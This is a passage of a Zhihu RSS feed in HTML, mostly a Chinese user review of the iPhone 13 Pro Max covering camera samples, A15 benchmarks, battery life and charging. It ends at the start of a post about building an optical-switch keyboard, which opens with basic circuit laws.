的长焦从50mm进化到65mm再到今年的77mm，基础是主摄的增强。主摄和三倍变焦的搭配，如果要实现二倍变焦，画面边缘就必须用主摄裁切来弥补，这就对主摄画质有极高的要求，这在暗光条件下尤其困难。</p>\n<p>这代 Pro 系列的主摄比上代又有了加强，像素达到了1.9μm，和13系列的两款低端机型拉开了差距，这就是 Apple 给出三倍变焦的底气。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5c754f1c109b5fc8517826f077deb447_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"376\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5c754f1c109b5fc8517826f077deb447\" data-watermark-src=\"v2-b9956b73cfc063955eabbe6f84f8f66a\" data-private-watermark-src=\"v2-f282bd32ee178fd90ece96dae779f1e9\"></p>\n<p>我们来分析样片。</p>\n<p>正常的游客打卡照当然毫无难度，这张逆光，开了高对比度模式，智能 HDR 处理得非常好，不用操心后期。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-885db904037152328086b05b18ef97b0_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-885db904037152328086b05b18ef97b0\" data-watermark-src=\"v2-10bfb757c45ec9c56d2314323637b855\" data-private-watermark-src=\"v2-54fc870ab3f3c4b1d05a03cd28c1b90f\"></p>\n<p>白平衡非常准确，比之前的 iPhone 又有了明显提升。这两张拍摄在日落之前阳光微微开始变黄的时候，iPhone 13 Pro Max 把光线还原得恰到好处。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3f8d40dad315c668189f0d9c2296514d_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3f8d40dad315c668189f0d9c2296514d\" data-watermark-src=\"v2-54d135422de2f7994a23e3da1153a2e4\" data-private-watermark-src=\"v2-396bbdbda773d7acf437e88f216b34dd\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-da69794abc3956c571b820fbe38b199e_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-da69794abc3956c571b820fbe38b199e\" data-watermark-src=\"v2-4fd34a7367571a27f900a74308688f3f\" data-private-watermark-src=\"v2-0c30fe63c01ce93cd11bfb8dc0760013\"></p>\n<p>作为摄影爱好者，Apple ProRAW 功能必须要吹，RAW 格式照片可以保留非常多的暗部细节，下面时修图前后的对比，正对太阳硬刚超大光比毫无压力。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7e4ce080f1fcbc7ac85bd12ac4be15c8_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7e4ce080f1fcbc7ac85bd12ac4be15c8\" data-watermark-src=\"v2-a9788a68441a640228ba115b6db7da3d\" data-private-watermark-src=\"v2-b33dd2d61333cd8c5217a089d03046a6\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-cce30b0d76ae25417d8aebd6055656eb_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cce30b0d76ae25417d8aebd6055656eb\" data-watermark-src=\"v2-1ea921ab8514c79df416e38aac5386a2\" data-private-watermark-src=\"v2-8041e6db3adb1cbf836afe2a212dc853\"></p>\n<p>得益于进光量的增大，夜景曝光时间缩短，纯净度增加，这张故意加了曝光，甚至能得到宛如白昼的效果，夜视仪实锤了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-986c574d81627059b5d7c8e2aa3a47e1_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-986c574d81627059b5d7c8e2aa3a47e1\" data-watermark-src=\"v2-b98f08c59ac082fcf3c0283ea7fea8a7\" data-private-watermark-src=\"v2-b54e65d9254c56f5eabc4142a8c44a3f\"></p>\n<p>暗光能力的提升对于吃饭验毒也很有帮助，这张是在光线超暗的西餐厅拍摄，配合烛光非常好看。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-da0cc5cd318d19bcfe76f3c75e79c6fd_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1536\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-da0cc5cd318d19bcfe76f3c75e79c6fd\" data-watermark-src=\"v2-33a8c49f0b5a0cd5e2be664368929ebf\" data-private-watermark-src=\"v2-2a692ec23d104d9169996fbc99e54fea\"></p>\n<p>最后是全景。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e6826cdb4d3771014c5a3651be9e2f67_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"365\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e6826cdb4d3771014c5a3651be9e2f67\" data-watermark-src=\"v2-c2c9f9f30cc393e0a9bdb02fe6614c87\" data-private-watermark-src=\"v2-41e32c7d3078b4dee6d5172970d3672b\"></p>\n<p><br></p>\n<p>iPhone 13 Pro 的超广角镜头也有了大幅度的升级，进光量明显增大，同时还支持微距功能，可玩性提升了很多，补齐了与安卓阵营的差距。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-461c2d170db40d9e2ce67be9dbb6c1d3_720w.jpg?rss\" data-rawwidth=\"1527\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>白天的样张</p>\n<p><img src=\"https://pic1.zhimg.com/v2-caf595605b3c45ad44af6186eae8e3b2_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-caf595605b3c45ad44af6186eae8e3b2\" data-watermark-src=\"v2-7d235c101b3f4dc4b8fed5e47a0838ae\" data-private-watermark-src=\"v2-b31e77d38b423fb8d327c3c19637ccec\"></p>\n<p>逆光 HDR</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2e7d5c00c46d3a696ca7b00d494a8612_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2e7d5c00c46d3a696ca7b00d494a8612\" data-watermark-src=\"v2-632ad00cead4dbfbd7899b224e253d91\" data-private-watermark-src=\"v2-1457c107db44267f405eb1306aca556b\"></p>\n<p>微距画质超乎我想象，比很多安卓机多加一个凑数微距功能好太多了。对于普通用户来说很容易上手，是一个观察世界的新角度。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-dcb1bbcfc6f2bc65c9c53b37f6f1244c_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-dcb1bbcfc6f2bc65c9c53b37f6f1244c\" data-watermark-src=\"v2-a26f9522fc8f984a299677831c5a8b08\" data-private-watermark-src=\"v2-7d3bb71183b1984743a5e536ee6bb1d0\"></p>\n<p>唯一不满意的是，如果在较近距离拍摄物体，尽管没有超出主摄的最近对焦距离，iPhone 13 Pro Max 也会自动切换到超广角镜头的微距模式，这在视频拍摄中可能会显得顺滑，但在光线较暗的情况拍照会出现明显的画质劣化。好在 Apple 已经宣布修复这个问题，在未来的 iOS 更新中会加入一个关闭自动切换的开关。</p>\n<p><br></p>\n<p>关于前置镜头，虽然它的画质并没有提升，但是得益于升级的图像处理引擎，这代 iPhone 13 Pro Max 的色彩科学也迎来了一次大跃进，可以给出极佳的肤色还原，比国产手机无脑磨皮美颜看着舒服太多了。这张开了高饱和模式，但是肤色并没有被一起拉高饱和度，非常自然。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-46720ee0e6c28dbe230e42647a284b3d_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-46720ee0e6c28dbe230e42647a284b3d\" data-watermark-src=\"v2-6e444f360336c1cb20831d749075fd0c\" data-private-watermark-src=\"v2-be5753aff6f99c02e322d38960a62739\"></p>\n<p><br></p>\n<p>这次 Apple 还放了一个大招：<b>个性化风格</b>。</p>\n<p>不就是个滤镜嘛？你可能会说。</p>\n<p>之前的手机滤镜，其实是手机先拍下照片，然后后期调色实现的。我们常见的 JPEG 和 新兴的 HEIF 格式照片其实都对画面信息压缩严重，对它们进行后期时不可避免要损失画质，如果后期幅度大还会遇到画面色阶断层的情况，比如下图的天空。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-af1a0e2b69a33bb16ea4b37d33fed341_720w.jpg?rss\" data-rawwidth=\"943\" data-rawheight=\"533\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>传统相机解决这个问题的方法是拍 RAW 格式照片，记录大量的原始成像数据不压缩，以求最大限度保留信息。去年 iPhone 12 Pro 系列开创性地将计算摄影和RAW格式结合起来，推出了 Apple Pro RAW 格式，让摄影爱好者的后期空间一下子大了起来。</p>\n<p>但是这样做弊端也是有的，一张1200万像素的照片体积达到40MB，相比之HEIF格式的照片大都能控制在2MB以下。</p>\n<p>有没有一种方法，既让创作者有调整照片的空间，又不用保存 RAW 格式文件呢？</p>\n<p><b>Apple 给出了一个漂亮的解决思路：把修图过程放在前期。拍摄者通过实时预览画面，先调出自己想要的色彩，拍摄的一瞬间手机直接把这个调整加在相机产生的RAW文件上，最后只保存一张HEIF/JPEG格式的照片。</b>这样做的难点在于实现精准的预览和快速的计算，需要手机有极为强大的视频能力和算力，这或许只有 iPhone 13 可以做到。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-db8f2e182f48805be5e9c0f5dec2954a_720w.jpg?rss\" data-rawwidth=\"1836\" data-rawheight=\"1927\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>我觉得官方给的几种风格都值得尝试，标准、高饱和、暖色调我都很常用，上面的样片你们也看到了。</p>\n<p>自定义的话，我有时候会选择在高饱和模式的基础上再增加一点暖色调，相机就把我这种风格命名为了“亮暖色”。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8bc0ec6e2e43b359bf5d323ff65b2363_720w.jpg?rss\" data-rawwidth=\"910\" data-rawheight=\"1968\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8bc0ec6e2e43b359bf5d323ff65b2363\" data-watermark-src=\"v2-6869af1e468f57a83b3fbb6018349232\" data-private-watermark-src=\"v2-db5a0666ab11f01668a2ebfa73849b89\"></p>\n<p>拍出来就是这样的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b27e1ab02d9e4f03804f77c9968e26a3_720w.jpg?rss\" data-rawwidth=\"1331\" data-rawheight=\"998\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b27e1ab02d9e4f03804f77c9968e26a3\" data-watermark-src=\"v2-21716f8a1d8a511da0850aacb91bd23b\" data-private-watermark-src=\"v2-95ae9c418c6f5b5baef53d209d0720ac\"></p>\n<p>个性化风格的拍摄体验也极好，选择好风格之后，取景框显示的图像和最终成片做到了几乎一致，所见即所得。</p>\n<p>总体来说，iPhone 13 Pro Max 拍照的软硬件均有了飞跃式的提升：更大的传感器带来更好的暗光画质，软件的进步带来了更好的色彩科学，也增加了可玩性。同时，它依然保留了之前 iPhone 相机的一贯优点：超快的处理速度、极低的快门延迟、易用的拍摄界面、自然的成像风格、较小的文件体积、方便的后期流程......<b>iPhone 13 Pro Max 把手机拍照的易用性放在了很高的位置，同时又给第一流的画质，是手机摄影爱好者趁手的工具。</b></p>\n<p><br></p>\n<p>视频方面，除了去年 iPhone 12 掀起热潮的 HDR 拍摄，今年 iPhone 13 Pro 系列还可以录制 ProRes 格式的视频。如果你不知道这是什么，那你肯定用不到，虽然这玩意数据量大到爆炸，每分钟 4K 视频要占用 6GB 空间，但这对专业用户来讲确实是个福音。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d3a009731a12de339356782510d79944_720w.jpg?rss\" data-rawwidth=\"1801\" data-rawheight=\"1660\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d3a009731a12de339356782510d79944\" data-watermark-src=\"v2-05a735f84170dd4dabb862bb18f6c12a\" data-private-watermark-src=\"v2-98073e329f60815720f90559392b9b55\"></p>\n<p>新出的电影效果我不太感兴趣，但是对于经常拍人的小伙伴可能会很有用。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f2298f797e8ecf030a4c6a54a74e2d59_720w.jpg?rss\" data-rawwidth=\"1788\" data-rawheight=\"1526\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f2298f797e8ecf030a4c6a54a74e2d59\" data-watermark-src=\"v2-4522611f82b22d4466c83c0a130b0762\" data-private-watermark-src=\"v2-3b2785276f039b0e1059c04f9a263024\"></p>\n<p>总之，视频方面 iPhone 13 Pro Max 最大的优势还是 4K 10bit HDR 视频的全流程体验，从拍摄到剪辑到观看，每个环节都做到了极致。B站等越来越多的视频平台已经支持了杜比视界 HDR 视频的上传和播放，个人创作分享 HDR 视频的时代已经到来了。</p>\n<p><br></p>\n<h2>性能</h2>\n<p>每次 iPhone 发布会的最大看点之一就是芯片，这是 Apple 技术实力的集中体现。Apple在芯片上领先多少我已经不像说了，款款芯片都是秒未来，能打败A14的，只有Apple自己的A15。</p>\n<p>iPhone 13 系列搭载的 A15 Bionic 采用了两大核四小核设计，台积电 5nm+制程。移动端最优的芯片架构设计结合地表最出色的半导体制程，性能必然是第一。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ac02ca67c6756d05edab446272b07c81_720w.jpg?rss\" data-rawwidth=\"1843\" data-rawheight=\"970\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>我们先看 CPU 部分，我手上这台 GB 5 的跑分如下。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4eabd736ef3140144f2a924310803ab6_720w.jpg?rss\" data-rawwidth=\"1284\" data-rawheight=\"1849\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4eabd736ef3140144f2a924310803ab6\" data-watermark-src=\"v2-84c45c7856eb24800d2b87a910adef0c\" data-private-watermark-src=\"v2-58eca94ac6543dee3c079075f8f8a245\"></p>\n<p>省电模式跑分如下：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e39f9b4b4cb9a3f7d435b62ed8b76e5c_720w.jpg?rss\" data-rawwidth=\"1283\" data-rawheight=\"1824\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e39f9b4b4cb9a3f7d435b62ed8b76e5c\" data-watermark-src=\"v2-f4a1d230a6b31942b9f92b7228870ddc\" data-private-watermark-src=\"v2-2fb333ee2aa5078a6fe929eeefc0b1d6\"></p>\n<p>A15 Bionic 的 CPU 大核心这次挤了牙膏，架构没换，仅靠更好的工艺提了一些频率。</p>\n<p>极客湾做了一个很不错的视频，横向分析了竞品的对比。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-31eb0891eb32f184988bc811499c6ffd_720w.jpg?rss\" data-rawwidth=\"1845\" data-rawheight=\"977\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-31eb0891eb32f184988bc811499c6ffd\" data-watermark-src=\"v2-31c54fbd01a5c71af5fd94ee5ffd2fa9\" data-private-watermark-src=\"v2-de90368462b480d1117a8dfa0bd6c57d\"></p>\n<p>可以看到，在决定日常使用体验的单核成绩方面，安卓阵营的骁龙 888 和麒麟 9000 连比 A13 都差得远，iPhone 的峰值性能已经达到非常恐怖的级别了，这也是果子可以肆无忌惮挤牙膏的原因。</p>\n<p>这次的小核心换了新架构，性能提升 20%， 而且能效比进一步增加。这就让整个 A15 芯片的能耗比和安卓阵营进一步拉开了差距，看图就能知道，省电模式下 A15 和 骁龙 888 性能相当，但是耗电量却连骁龙的一半都不到。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bb224cab30930abbb2c8faa1b3134c47_720w.jpg?rss\" data-rawwidth=\"1840\" data-rawheight=\"1035\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bb224cab30930abbb2c8faa1b3134c47\" data-watermark-src=\"v2-2913d6f42421952b3849a8f12fd09815\" data-private-watermark-src=\"v2-b16645fe73277174db119ef2b526b7b1\"></p>\n<p>A15 Bionic 的 GPU 提升就非常厉害了。iPhone 13 和 13 mini 和前代一样，拥有四个 GPU 核心，但是 iPhone 13 Pro 系列的两款机型却有五个。<b>这是 Apple 首次在同代 iPhone 上做出高低端性能区分，类似的操作我们在 Mac 的 M1 芯片上已经见过了</b>（低端7核高端8核）。A15 的 GPU 不仅增加了核心规模，而且架构也迎来了升级，综合起来使得 Pro 系列的 GPU 性能比前代爆发性提升 50%，如果你追求极致的游戏性能，那么这次也有了上 Pro 系列的理由。</p>\n<p>我用 3DMark Wild Life 来测试 iPhone 13 Pro Max 的 GPU 性能，它可以反映手机在运行大型游戏时的实际性能表现。</p>\n<p>性能如下：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-255ff2e141a2677ce02357437c2770c2_720w.jpg?rss\" data-rawwidth=\"1284\" data-rawheight=\"1874\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-255ff2e141a2677ce02357437c2770c2\" data-watermark-src=\"v2-af4104515eb88bbd46c5251523bf2d0a\" data-private-watermark-src=\"v2-76e8036d2882e56ae60a8d2eae4d8012\"></p>\n<p>省电模式性能如下</p>\n<p><img src=\"https://pic2.zhimg.com/v2-59c97043fc3863e87caecdbe311867ac_720w.jpg?rss\" data-rawwidth=\"1230\" data-rawheight=\"1968\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-59c97043fc3863e87caecdbe311867ac\" data-watermark-src=\"v2-d2572015798c31dae9d60388bd7f3f56\" data-private-watermark-src=\"v2-68ff1d5ff183c313df798f7fa683a77e\"></p>\n<p>正常模式下，iPhone 13 Pro Max 的综合游戏性能比我去年测的 iPhone 12 提升 30%，体验提升非常明显。</p>\n<p>能效比方面，我们来看极客湾跑的 Aztec Ruin 测试。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-19f7f494c152c1a59e2b159af30dc234_720w.jpg?rss\" data-rawwidth=\"1837\" data-rawheight=\"965\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-19f7f494c152c1a59e2b159af30dc234\" data-watermark-src=\"v2-abd0ba6bfb8662d27165de6ff5434152\" data-private-watermark-src=\"v2-781db27ace32c8c70d9b1c41f53b554f\"></p>\n<p>开启省电模式时，A15 的性能和麒麟 9000 打平，但是能耗只有不到三分之一；同时，A15 省电模式下比 骁龙 888 高17%，功耗也只有后者三分之一。这样的差距，不知道安卓公版 GPU 要多少年才能追上来。</p>\n<p>我们再来连续跑 20 轮测试，看看 iPhone 13 Pro Max 在长期游戏中会不会过热降频。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1f6282348fc51807d2bc1a945a0662be_720w.jpg?rss\" data-rawwidth=\"1284\" data-rawheight=\"1920\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1f6282348fc51807d2bc1a945a0662be\" data-watermark-src=\"v2-34ef0c41e7fd993fa0d951b8e0913522\" data-private-watermark-src=\"v2-248f6ec0a127c0504070f5d9d279a3fd\"></p>\n<p>可以看到，前两个循环，A15 都可以在最高性能下运行，成绩在11500分左右，到了第三个循环开始下降，随后成绩一直稳定在8500分以上。</p>\n<p>8500 分什么概念呢？骁龙 888 只跑一轮峰值不到 5700，麒麟 9000 只跑一轮峰值也就 6800，降频之后更是惨不忍睹 。这反应到实际游戏中，一个例子就是米哈游给 iOS 端《原神》的中画质就相当于安卓端的高画质，安卓再给高就跑不动了。如果你玩《原神》这样的大型单机游戏，iPhone 13 Pro Max 就是你现在能买到的最合适的手机。</p>\n<p>和老机器对比一下：去年我测试了 iPhone 12，它的成绩峰值在8900分左右，稳定值一般在 7200 分左右，但是中间会有几次掉到 4300 分。这就意味着 iPhone 12 在长时间游戏时会有偶尔的性能骤降现象，但是这在 iPhone 13 Pro Max 上就完全没有出现。</p>\n<p>A15 Bionic 还有个很恐怖的点，发布会只提了一句：缓存容量翻倍。要知道A系列芯片的缓存放在手机SoC中早已是怪物级别了，这次又翻倍，这对游戏性能的提升显然也是起到了帮助。</p>\n<p>神经引擎也获得了例行的提升，这让 Apple 把语音、文字识别等功能直接在 iPhone 本地解决，不但速度更快，也保护了用户的隐私。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8973ada042d76758b4d8131842564973_720w.jpg?rss\" data-rawwidth=\"3840\" data-rawheight=\"2160\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>下面是 A15 Bionic 的一图汇总。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ae9e21e6bb529ea4519e9ca39d7f7fae_720w.jpg?rss\" data-rawwidth=\"3840\" data-rawheight=\"2160\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<h2>电池&amp;续航</h2>\n<p>续航方面，由于换用了更加省电的屏幕、能效更高的处理器和容量更大的电池，iPhone 13 Pro Max 的官方宣传续航时间有所增强。</p>\n<p>这是我过去十天重度使用之后的电池用量统计。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1179b223201c6a8254db4e0eead5f8da_720w.jpg?rss\" data-rawwidth=\"1284\" data-rawheight=\"1023\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1179b223201c6a8254db4e0eead5f8da\" data-watermark-src=\"v2-e1f409e9a8c23b2af7625c2901e65403\" data-private-watermark-src=\"v2-9ca246548f9d34ee830a3db05bc8a1e3\"></p>\n<p>其中有一天我正好测到 100% 的电池用量（靠把手机放在一边播放 4K 60P视频），续航接近9.5小时。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-41462176130b2054ca3966df67bd8339_720w.jpg?rss\" data-rawwidth=\"1284\" data-rawheight=\"1195\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-41462176130b2054ca3966df67bd8339\" data-watermark-src=\"v2-0dc822b4a095d4cce4e0c7560a5f316c\" data-private-watermark-src=\"v2-3d3ee119914299cc282ec6080202f4e3\"></p>\n<p>那天使用 App 的情况如下（抱歉某些在美国用的 App 打码了）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-280f4183eb209394f1f116319847437b_720w.jpg?rss\" data-rawwidth=\"1037\" data-rawheight=\"1968\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-280f4183eb209394f1f116319847437b\" data-watermark-src=\"v2-a5b19663c87ff7be3a9fd4556eeda2b0\" data-private-watermark-src=\"v2-b27c5ca57648bd94527db8a5d0b7835e\"></p>\n<p>这是为了最大限度压榨续航，如果按照我平时的使用习惯，手机看视频只看 1440P，亮度也不会调满，那么两天使用肯定是没问题的。<b>我想对于大多数用户，iPhone 13 Pro Max 都是一台可以用两天的手机，这放在之前的 iPhone 上是不可想象的。</b></p>\n<p><br></p>\n<p><b>每代 iPhone 的充电都整个手机上的最大槽点，iPhone 13 Pro Max 也不能幸免。</b></p>\n<p>Apple 从来不宣传 iPhone 最大峰值充电功率，根据网上很多博主的测试，<b>13 Pro 系列的峰值充电功率在 27W 左右</b>，比上代 23W 略增。<b>我用功率足够的 PD 充电器给 iPhone 13 Pro Max 快充，测试得到 20 分钟充入 31% 的电量。</b></p>\n<p>Apple 以环保为名不给 iPhone 配充电器的事情去年大家骂了一年，我也不再骂了，毕竟很多厂商也已经跟风了。iPhone 走的还是公有的 PD 充电协议，第三方的产品很多，价格也亲民，比起某些厂商私有协议充电器卖三百多甚至要良心一点。</p>\n<p><b>我个人一直是PD和无线充交替使用，我建议所有iPhone用户都入手一套PD快充，iPhone 8 之后的所有 iPhone 都支持 PD 充电，比老机器原装的 5W 充电器好太多，如果长时间在固定位置办公最好再加一个无线充电板，就算未来换机也能继续用。</b></p>\n<p>关于充电器的选购，我觉得大家买 20W 的就行了，反正峰值功率 27W 也坚持不了多久，还不如追求小巧便携。我现在在用图拉斯的小冰块，体积和 Apple 自家的 5W 充电器相近，却支持 20W 的 PD 协议快充，温度控制也极佳。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428209397399515136\"></a><p><img src=\"https://pic3.zhimg.com/v2-8d8204e32a4c83238aa8223d0a4c7009_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"中间的就是小冰块，左华为40W，右 Apple 30W，体积差距一眼可见\" data-watermark=\"watermark\" data-original-src=\"v2-8d8204e32a4c83238aa8223d0a4c7009\" data-watermark-src=\"v2-b930934556d8fcef11fd61c69a1db468\" data-private-watermark-src=\"v2-52b9ffa7412353aa32956b529d41a409\"></p>\n<h2>信号</h2>\n<p>信号一直是大家最关心 iPhone 的一个点，毕竟之气的教训是有的， iPhone 11 那代用的 Intel 基带就导致双卡用户的信号不太行。</p>\n<p>iPhone 13 Pro Max 的信号比起我之前用的 iPhone 12 有提高，我在家里之前用 12 是一格信号，但是用 13 Pro Max 最差也有两格。其实 12 的信号已经可以了，在美国大多数一格信号的地方联网都没问题，我用 13 PM 十天的时间里，一次网络不稳定都没遇到过。</p>\n<p>这代 iPhone 换用了高通最新的 SDX60M 基带，不仅网络质量有提升，新的 5nm 工艺也让它的发热量更小，即便是在阳光下用蜂窝网络打网游，我也没遇到过屏幕降亮度的情况。</p>\n<p><br></p>\n<h2>总结</h2>\n<p><b>从上面的分析来看，iPhone 13 Pro 系列的进步幅度是巨大的，屏幕、相机、续航这三方面终于补齐了硬件规格的短板来到顶级，而且继续保持了做工、系统、扬声器等方面的传统优势。 </b></p>\n<p>今年，Apple 在性能和屏幕刷新率这两个关键方面第一次给了 Pro 系列特殊优待，相机方面也和非 Pro 系列在规格上明显拉开了差距，这让 Pro 系列机型给了用户明显更好的日常使用体验。如果再考虑 Pro 系列多 2GB 的运存，我认为在性价比方面，这代 Pro 系列和普通系列是持平的。</p>\n<p>如果你预算充足，追求做工和颜值，重视性能，喜爱手机摄影，那么我认为今年的 Pro 系列是有史以来最值得买的 Apple 旗舰机型，非常值得入手。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428218133404934144\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428218490460860416\"></a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/chen-song-8-68?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">哈哈哈</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488101053/answer/2159710371?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">248 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/440500612?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">我是现在买iphone12还是等13 ?</a><br><a href=\"http://www.zhihu.com/question/432063316?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">iPhone 12能用多久？</a><br>\n","link":"http://www.zhihu.com/question/488101053/answer/2159710371?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"Goodbye, 机械键盘","date":"2021-10-08 11:18:32","description":"\n<p><a href=\"https://zhuanlan.zhihu.com/p/41285686\" class=\"internal\">上一篇文章</a>中，做的机械键盘用了三年多，我寻思可以换个新的了。那正好和机械键盘说再见，做个光轴键盘。同时也可以作为电子电路的 Hello world 研究作业。</p>\n<h2>电路的基础知识</h2>\n<p>作为电子电路的外行人士，还是需要学习一个。</p>\n<p>第一是重温电路的基本定律：</p>\n<ul>\n<li>欧姆定律</li>\n<li>基尔霍夫电流定律，基尔霍夫电压定律</li>\n<li>戴维南定理</li>\n</ul>\n<p>依靠这些基本定律，可以通过解线性方程组的方式进行电路分析。</p>\n<p>然后引入非线性元件：</p>\n<ul>\n<li>电感： <img src=\"https://www.zhihu.com/equation?tex=V%3DL%5Cfrac%7BdI%7D%7Bdt%7D\" alt=\"V=L\\frac{dI}{dt}\" eeimg=\"1\">\n</li>\n<li>电容： <img src=\"https://www.zhihu.com/equation?tex=I%3DC%5Cfrac%7BdV%7D%7Bdt%7D\" alt=\"I=C\\frac{dV}{dt}\" 